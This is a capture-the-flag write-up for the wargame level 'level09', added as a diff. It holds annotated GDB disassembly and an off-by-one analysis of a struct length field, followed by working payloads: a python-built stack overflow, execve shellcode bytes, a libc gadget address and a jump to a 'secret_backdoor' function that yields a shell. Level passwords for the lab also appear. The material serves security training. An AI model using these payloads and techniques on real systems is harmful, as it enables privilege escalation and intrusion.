@@ -1,0 +1,450 @@
+login : pw
+	level09 : fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+################################################
+GDB
+################################################
+
+=> disas main
+	0x0000000000000aa8 <+0>:	push   rbp
+	0x0000000000000aa9 <+1>:	mov    rbp,rsp
+	0x0000000000000aac <+4>:	lea    rdi,[rip+0x15d]        # 0xc10
+	0x0000000000000ab3 <+11>:	call   0x730 <puts@plt>
+		=> start
+			0x0000555555554aac in main ()
+		=> ni
+			0x0000555555554ab3 in main ()
+		=> x/s rdi
+			0x555555554c10:	 '-' <repeats 44 times>, "\n|   ~Welcome to l33t-m$n ~    v1337        |\n", '-' <repeats 44 times>
+
+	0x0000000000000ab8 <+16>:	call   0x8c0 <handle_msg>
+		# Refer to '=> disas handle_msg'
+
+	0x0000000000000abd <+21>:	mov    eax,0x0
+	0x0000000000000ac2 <+26>:	pop    rbp
+	0x0000000000000ac3 <+27>:	ret
+
+=> disas handle_msg
+	0x00005555555548c0 <+0>:	push   rbp
+	0x00005555555548c1 <+1>:	mov    rbp,rsp
+	0x00005555555548c4 <+4>:	sub    rsp,0xc0
+		=> p/d 192
+		# At most 192 bytes allocated on the stack from handle_msg function
+
+	0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
+		# New local var, [rbp-0xc0], let's call it 'a'
+
+	0x00005555555548d2 <+18>:	add    rax,0x8c
+	0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
+	0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
+	0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
+	0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
+	0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
+	0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c
+		=> p/d 0x8c
+			140
+		# QWORD = 2 * 4 = 8 bytes
+		# New local var, [rbp-0xc0+0x8c], let's call it 'buf'
+		# size of 'buf' = (4*2) * 5 = 40 bytes
+		# All set up as 0
+		# New local var, [rbp-0xc], let's call it 'b'
+
+	0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
+	0x000055555555490d <+77>:	mov    rdi,rax
+	0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
+		# [rbp-0xc0] = 'a'
+		# Refer to '=> disas set_username'
+
+	0x0000555555554915 <+85>:	lea    rax,[rbp-0xc0]
+	0x000055555555491c <+92>:	mov    rdi,rax
+	0x000055555555491f <+95>:	call   0x555555554932 <set_msg>
+		# [rbp-0xc0] = 'a'
+		# Refer to '=> disas set_msg'
+
+	0x0000555555554924 <+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
+	0x000055555555492b <+107>:	call   0x555555554730 <puts@plt>
+		=> x/s 0x555555554bc0
+			0x555555554bc0:	 ">: Msg sent!"
+
+	0x0000555555554930 <+112>:	leave
+	0x0000555555554931 <+113>:	ret
+
+=> disas set_username
+	0x00005555555549cd <+0>:	push   rbp
+	0x00005555555549ce <+1>:	mov    rbp,rsp
+	0x00005555555549d1 <+4>:	sub    rsp,0xa0
+		=> p/d 0xa0
+			160
+		# At most 160 bytes allocated on the stack from set_username function
+
+	0x00005555555549d8 <+11>:	mov    QWORD PTR [rbp-0x98],rdi
+		# New local var, [rbp-0x98], let's call it 'b'
+		# It holds function param 'a'
+
+	0x00005555555549df <+18>:	lea    rax,[rbp-0x90]
+	0x00005555555549e6 <+25>:	mov    rsi,rax
+	0x00005555555549e9 <+28>:	mov    eax,0x0
+	0x00005555555549ee <+33>:	mov    edx,0x10
+	0x00005555555549f3 <+38>:	mov    rdi,rsi
+	0x00005555555549f6 <+41>:	mov    rcx,rdx
+	0x00005555555549f9 <+44>:	rep stos QWORD PTR es:[rdi],rax
+		=> p/d 0x10
+			16
+		# New local var, [rbp-0x90], let's call it 'buf'
+		# rep stos, copies into rdi the value in rax
+		# QWORD = 2 * 4 = 8 bytes
+		# Counter rcx = 16
+		# This set 16 * 8 = 128 bytes to 0 in 'buf'
+
+	0x00005555555549fc <+47>:	lea    rdi,[rip+0x1e1]        # 0x555555554be4
+	0x0000555555554a03 <+54>:	call   0x555555554730 <puts@plt>
+	0x0000555555554a08 <+59>:	lea    rax,[rip+0x1d0]        # 0x555555554bdf
+	0x0000555555554a0f <+66>:	mov    rdi,rax
+	0x0000555555554a12 <+69>:	mov    eax,0x0
+	0x0000555555554a17 <+74>:	call   0x555555554750 <printf@plt>
+		=> x/s 0x555555554be4
+			0x555555554be4:	 ">: Enter your username"
+		=> x/s 0x555555554bdf
+			0x555555554bdf:	 ">>: "
+
+	0x0000555555554a1c <+79>:	mov    rax,QWORD PTR [rip+0x201595]        # 0x555555755fb8
+	0x0000555555554a23 <+86>:	mov    rax,QWORD PTR [rax]
+	0x0000555555554a26 <+89>:	mov    rdx,rax
+	0x0000555555554a29 <+92>:	lea    rax,[rbp-0x90]
+	0x0000555555554a30 <+99>:	mov    esi,0x80
+	0x0000555555554a35 <+104>:	mov    rdi,rax
+	0x0000555555554a38 <+107>:	call   0x555555554770 <fgets@plt>
+		=> p/d 0x80
+			128
+		=> x *(long*)0x555555755fb8
+			0x7ffff7dd4838 <stdin>:	0x00007ffff7dd4340
+		# [rbp-0x90] = 'buf'
+
+	0x0000555555554a3d <+112>:	mov    DWORD PTR [rbp-0x4],0x0
+	0x0000555555554a44 <+119>:	jmp    0x555555554a6a <set_username+157>
+		# New local var, [rbp-0x4], let's call it 'c'
+
+	0x0000555555554a46 <+121>:	mov    eax,DWORD PTR [rbp-0x4] # Jumped here from set_username+178
+	0x0000555555554a49 <+124>:	cdqe
+		# [rbp-0x4] = 'c'
+		# cdqe -> rax = QWORD eax
+
+	0x0000555555554a4b <+126>:	movzx  ecx,BYTE PTR [rbp+rax*1-0x90]
+	0x0000555555554a53 <+134>:	mov    rdx,QWORD PTR [rbp-0x98]
+	0x0000555555554a5a <+141>:	mov    eax,DWORD PTR [rbp-0x4]
+	0x0000555555554a5d <+144>:	cdqe   
+	0x0000555555554a5f <+146>:	mov    BYTE PTR [rdx+rax*1+0x8c],cl
+	0x0000555555554a66 <+153>:	add    DWORD PTR [rbp-0x4],0x1
+		# [rbp-0x90] = 'buf'
+		# [rbp-0x98] = 'b'
+		# set_username+126 -> ecx = buf['c']
+		# set_username+134 -> rdx = 'b'
+		# set_username+141 -> eax = 'c'
+		# set_username+144 -> rax = QWORD eax
+		# set_username+146 -> *(*'b' + 'c' + 0x8c) = buf['c']
+		# OHHHHH 0x8c is the string offset from handle_msg, we have a struct
+		# Ok I need to rewrite source.c
+		# So now 'a' in handle_msg is a struct containing a 'buf' of size 40
+		# I suspect 'b' to be part of the struct as well
+		# set_username function param is no longer a long ptr, rather a struct ptr
+		# The local var 'b' becomes a the struct ptr
+		# set_username+146 -> (*'b').buf['c'] = buf['c']
+		# set_username+153 -> 'c' += 1
+
+	0x0000555555554a6a <+157>:	cmp    DWORD PTR [rbp-0x4],0x28 # Jumped here from set_username+119
+	0x0000555555554a6e <+161>:	jg     0x555555554a81 <set_username+180>
+		=> p/d 0x28
+			40
+		# [rbp-0x4] = 'c'
+		# Will jump if 'c' greater than 40
+
+	0x0000555555554a70 <+163>:	mov    eax,DWORD PTR [rbp-0x4]
+	0x0000555555554a73 <+166>:	cdqe   
+		# [rbp-0x4] = 'c'
+		# cdqe -> rax = QWORD eax
+
+	0x0000555555554a75 <+168>:	movzx  eax,BYTE PTR [rbp+rax*1-0x90]
+	0x0000555555554a7d <+176>:	test   al,al
+	0x0000555555554a7f <+178>:	jne    0x555555554a46 <set_username+121>
+		# [rbp-0x90] = 'buf'
+		# buf['c']
+		# Will jump if buf['c'] != 0
+		# Loop
+
+	0x0000555555554a81 <+180>:	mov    rax,QWORD PTR [rbp-0x98] # Jumped here from set_username+161
+	0x0000555555554a88 <+187>:	lea    rdx,[rax+0x8c]
+	0x0000555555554a8f <+194>:	lea    rax,[rip+0x165]        # 0x555555554bfb
+	0x0000555555554a96 <+201>:	mov    rsi,rdx
+	0x0000555555554a99 <+204>:	mov    rdi,rax
+	0x0000555555554a9c <+207>:	mov    eax,0x0
+	0x0000555555554aa1 <+212>:	call   0x555555554750 <printf@plt> # Jumped here from set_username+161
+		=> x/s 0x555555554bfb
+			0x555555554bfb:	 ">: Welcome, %s"
+		# [rbp-0x98] = 'b'
+		# [rax+0x8c] = (*'b').'buf'
+
+	0x0000555555554aa6 <+217>:	leave  
+	0x0000555555554aa7 <+218>:	ret
+
+=> disas set_msg
+	0x0000555555554932 <+0>:	push   rbp
+	0x0000555555554933 <+1>:	mov    rbp,rsp
+	0x0000555555554936 <+4>:	sub    rsp,0x410
+		=> p/d 0x410
+			1040
+
+	0x000055555555493d <+11>:	mov    QWORD PTR [rbp-0x408],rdi
+		# New local var, [rbp-0x408], let's call it 'd'
+		# it holds passed structure pointer
+
+	0x0000555555554944 <+18>:	lea    rax,[rbp-0x400]
+	0x000055555555494b <+25>:	mov    rsi,rax
+	0x000055555555494e <+28>:	mov    eax,0x0
+	0x0000555555554953 <+33>:	mov    edx,0x80
+	0x0000555555554958 <+38>:	mov    rdi,rsi
+	0x000055555555495b <+41>:	mov    rcx,rdx
+	0x000055555555495e <+44>:	rep stos QWORD PTR es:[rdi],rax
+		=> p/d 0x80
+			128
+		# New local var, [rbp-0x400], let's call it 'e'
+		# QWORD = 2 * 4 = 8 bytes
+		# put rax value into rdi QWORD bytes after QWORD bytes
+		# Counter rcx = 128
+		# 128 * 8 = 1024 bytes
+		# e has a size of 1024 bytes each of them set to 0
+
+	0x0000555555554961 <+47>:	lea    rdi,[rip+0x265]        # 0x555555554bcd
+	0x0000555555554968 <+54>:	call   0x555555554730 <puts@plt>
+	0x000055555555496d <+59>:	lea    rax,[rip+0x26b]        # 0x555555554bdf
+	0x0000555555554974 <+66>:	mov    rdi,rax
+	0x0000555555554977 <+69>:	mov    eax,0x0
+	0x000055555555497c <+74>:	call   0x555555554750 <printf@plt>
+		=> x/s 0x555555554bcd
+			0x555555554bcd:	 ">: Msg @Unix-Dude"
+		=> x/s 0x555555554bdf
+			0x555555554bdf:	 ">>: "
+
+	0x0000555555554981 <+79>:	mov    rax,QWORD PTR [rip+0x201630]        # 0x555555755fb8
+	0x0000555555554988 <+86>:	mov    rax,QWORD PTR [rax]
+	0x000055555555498b <+89>:	mov    rdx,rax
+	0x000055555555498e <+92>:	lea    rax,[rbp-0x400]
+	0x0000555555554995 <+99>:	mov    esi,0x400
+	0x000055555555499a <+104>:	mov    rdi,rax
+	0x000055555555499d <+107>:	call   0x555555554770 <fgets@plt>
+		=> x *(long*)0x555555755fb8
+			0x7ffff7dd4838 <stdin>:	64
+		=> p/d 0x400
+			1024
+		# [rbp-0x400] = 'e'
+
+	0x00005555555549a2 <+112>:	mov    rax,QWORD PTR [rbp-0x408]
+	0x00005555555549a9 <+119>:	mov    eax,DWORD PTR [rax+0xb4]
+	0x00005555555549af <+125>:	movsxd rdx,eax
+	0x00005555555549b2 <+128>:	lea    rcx,[rbp-0x400]
+	0x00005555555549b9 <+135>:	mov    rax,QWORD PTR [rbp-0x408]
+	0x00005555555549c0 <+142>:	mov    rsi,rcx
+	0x00005555555549c3 <+145>:	mov    rdi,rax
+	0x00005555555549c6 <+148>:	call   0x555555554720 <strncpy@plt>
+		# [rbp-0x408] = 'd'
+		# [rbp-0x400] 'e'
+		# strncpy( *'d', e, *('d' + 0xb4) )
+		# Is it the suspected 'b' from handle_msg to be a part of the struct ?
+		# In handle_msg
+		#	[rbp-0xc0] is 'a'
+		#	[rbp-0xc0+0x8c] is 'a.buf'
+		#	[rbp-0xc] is 'b'
+		=> p/d -0xc0
+			-192
+			# struct starts in -192
+		=> p/d -0xc
+			-12
+			# int starts in -12
+		=> p/d 0xb4
+			180
+			# Added to struct start
+			# -192 + 180 = -12 = int start
+		#	The int 'b' is part of the structure
+		# Lets rewrite again source.c with 'a.b' being the int
+		# *'d' doesnt fit my (*'d').buf offset, in strncpy call as it doesnt add 0x8c
+		# There is something else at offset 0
+		# As it is passed to strncpy, it must be a string
+		# 'buf' starts at +0x8c
+		=> p/d 0x8c
+			140
+		#	This is my first struct string size
+		#	Lets call this var 'str'
+		#	So the struct looks:
+		#		s.str (size 140)
+		#		s.buf (size 40)
+		#		s.b (size 4)
+
+	0x00005555555549cb <+153>:	leave  
+	0x00005555555549cc <+154>:	ret 
+
+=> disas secret_backdoor
+	0x000055555555488c <+0>:	push   rbp
+	0x000055555555488d <+1>:	mov    rbp,rsp
+	0x0000555555554890 <+4>:	add    rsp,0xffffffffffffff80
+	0x0000555555554894 <+8>:	mov    rax,QWORD PTR [rip+0x20171d]        # 0x555555755fb8
+	0x000055555555489b <+15>:	mov    rax,QWORD PTR [rax]
+	0x000055555555489e <+18>:	mov    rdx,rax
+	0x00005555555548a1 <+21>:	lea    rax,[rbp-0x80]
+	0x00005555555548a5 <+25>:	mov    esi,0x80
+	0x00005555555548aa <+30>:	mov    rdi,rax
+	0x00005555555548ad <+33>:	call   0x555555554770 <fgets@plt>
+		=> x *(char**) 0x555555755fb8
+			0x7ffff7dd4838 <stdin>:	64
+		=> p/d 0x80
+			128
+		# New local var, [rbp-0x80], let's call it 'f'
+
+	0x00005555555548b2 <+38>:	lea    rax,[rbp-0x80]
+	0x00005555555548b6 <+42>:	mov    rdi,rax
+	0x00005555555548b9 <+45>:	call   0x555555554740 <system@plt>
+		# [rbp-0x80] = 'f'
+		
+	0x00005555555548be <+50>:	leave  
+	0x00005555555548bf <+51>:	ret
+
+################################################
+SUMMARY
+################################################
+
+main
+	call handle_msg
+
+handle_msg
+	get 128 chars from stdin
+	copies 41 of them into struct a->buf which has a size of 40 bytes
+		struct looks like:
+			s.str (size 140)
+			s.buf (size 40)
+			s.b   (size 4)
+		So here I should be able to overwrite 1 byte from s.b
+		LSB so 140 is stored on first byte
+			I can change this value and put whatever I want from 0 up to 255
+
+set_msg
+	get 1024 chars from stdin stored in e
+	strncpy with
+		s.str (size 140)
+		e
+		s.b
+			s.b can be overwritten from handle_msg
+			I can change the strncpy size up to 255
+
+################################################
+EXPLOIT
+################################################
+
+# Let's check first if we can indeed overwrite s.b
+=> python -c 'print "a" * 40 + "\xff"' > /tmp/e
+# s.b is set up with 140 value in an int
+=> b *handle_msg+70
+	# Right after s.b initialisation to 140
+=> r < /tmp/e
+# s.b is in [rbp-0xc]
+=> x/ub $rbp-0xc
+	0x7fffffffe4a4:	140
+	# s.b holds 140 at this stage
+	# s.b address is 0x7fffffffe4a4
+=> b *handle_msg+95
+	# Right before set_msg call
+=> c
+=> x/ub $rbp-0xc
+	0x7fffffffe4a4:	255
+	# Perfect, it works
+
+# struct s start address is [rbp-0xc0]
+=> p/x $rbp-0xc0
+	0x7fffffffe3f0
+=> i f
+	rbp at 0x7fffffffe4b0, rip at 0x7fffffffe4b8
+	# We need to overwrite rip whose address is 0x7fffffffe4b8
+=> p/d 0x7fffffffe4b8-0x7fffffffe3f0
+	200
+	# rip starts 200 bytes after the start address of the struct
+	# We can overwrite it as we can go up to 255
+=> p/x 208
+	0xd0
+
+# http://shell-storm.org/shellcode/files/shellcode-806.php
+=> env -i payload=$(python -c 'print "\x90"*10000 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"') gdb level09
+=> unset env LINES
+=> unset env COLUMNS
+=> start
+=> x/s *((char**)$rdx)
+	0x7fffffffc890:	 "payload=...
+=> p/x 0x7fffffffc890+5000
+	0x7fffffffdc18
+# Lets build our payload
+=> python -c 'print "a"*40 + "\xd0" + "\n" + "b"*200 + "\x18\xdc\xff\xff\xff\x7f\x00\x00"' > /tmp/e
+
+=> r < /tmp/e
+	Program received signal SIGSEGV, Segmentation fault.
+	0x00007fffffffdc18 in ?? ()
+# I overwrited the rip but it segfaulted on the nop sled
+# I tried a couple of things but my guess is the stack is not executable
+
+# I need to use an existing code
+=> info proc map
+	0x7ffff7a1c000     0x7ffff7bd0000   0x1b4000        0x0 /lib/x86_64-linux-gnu/libc-2.15.so
+=> strings -tx /lib/x86_64-linux-gnu/libc-2.15.so | grep /bin/sh
+	178d0f /bin/sh
+	# "/bin/sh" offset is 178d0f in hex
+=> objdump -M intel -d /lib/x86_64-linux-gnu/libc-2.15.so | grep "execve" -B5 | grep rdi -C3 | grep 178d0f -C3
+	e219a:	48 8b 05 c7 4c 2d 00 	mov    rax,QWORD PTR [rip+0x2d4cc7]        # 3b6e68 <_IO_file_jumps+0x808>
+	e21a1:	48 8d b4 24 40 01 00 	lea    rsi,[rsp+0x140]
+	e21a8:	00 
+	e21a9:	48 8d 3d 5f 6b 09 00 	lea    rdi,[rip+0x96b5f]        # 178d0f <_libc_intl_domainname+0x1f3>
+	e21b0:	48 8b 10             	mov    rdx,QWORD PTR [rax]
+	e21b3:	e8 98 d2 fd ff       	call   bf450 <execve>
+	# Perfect, rdi is set up as "/bin/sh" and execve is called afterward
+	# Target e219a as e21a9 would segfault in e21b0 because rax will be puts return value
+=> env -i gdb level09
+=> unset env LINES
+=> unset env COLUMNS
+=> start
+=> info proc map
+	0x7ffff7a1c000     0x7ffff7bd0000   0x1b4000        0x0 /lib/x86_64-linux-gnu/libc-2.15.so
+	# Start address 0x7ffff7a1c000
+=> p/x 0x7ffff7a1c000+0xe219a
+	0x7ffff7afe19a
+=> x/5i 0x7ffff7afe19a
+	0x7ffff7afe19a:	mov    rax,QWORD PTR [rip+0x2d4cc7]        # 0x7ffff7dd2e68
+	0x7ffff7afe1a1:	lea    rsi,[rsp+0x140]
+	0x7ffff7afe1a9:	lea    rdi,[rip+0x96b5f]        # 0x7ffff7b94d0f
+	0x7ffff7afe1b0:	mov    rdx,QWORD PTR [rax]
+	0x7ffff7afe1b3:	call   0x7ffff7adb450 <execve>
+# Lets build our payload
+=> python -c 'print "a"*40 + "\xd0" + "\n" + "b"*200 + "\x9a\xe1\xaf\xf7\xff\x7f\x00\x00"' > /tmp/e
+=> r < /tmp/e
+	process 2222 is executing new program: /bin/dash
+	[env displayed ...]
+	[Inferior 1 (process 2222) exited with code 0177]
+	# I tried outside gdb
+	=> ./level09 < /tmp/e
+		LC_TELEPHONE=fr_FR.UTF-8: 0: Can't open LS_COLORS...
+	=> echo $?
+		127
+		# 127 is error code for shell command not found
+	# I wanted the command to be recognized, so after investigation I came up with:
+	=> echo '/bin/cat /home/users/end/.pass' > /tmp/test
+	=> chmod 777 /tmp/test
+	=> env -u LC_TELEPHONE -u LS_COLORS -u PATH -u MAIL -u LC_IDENTIFICATION -u PWD -u LANG -u LC_MEASUREMENT -u HOME -u SHLVL -u LANGUAGE -u LOGNAME -u SSH_CONNECTION -u LESSOPEN -u LC_TIME -u LESSCLOSE -u LC_NAME -u OLDPWD -u _ USER=end '/tmp/test';='' ./level09 < /tmp/e
+		/bin/cat: /home/users/end/.pass: Permission denied
+	# I must say I tried several things but I was always level09
+	# I tend to think there is a way to make this work but I was lazy and not sure plus 
+	#	I noticed something interesting somewhere else
+
+# During my research, I saw an interesting function
+=> info func
+	0x000055555555488c  secret_backdoor
+# I disassembled it, it reads stdin and then system the input
+# Lets build our payload
+=> python -c 'print "a"*40 + "\xd0" + "\n" + "b"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"' > /tmp/e
+=> cat /tmp/e - | ./level09
+=> whoami
+	end
+=> cat /home/users/end/.pass
+	j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
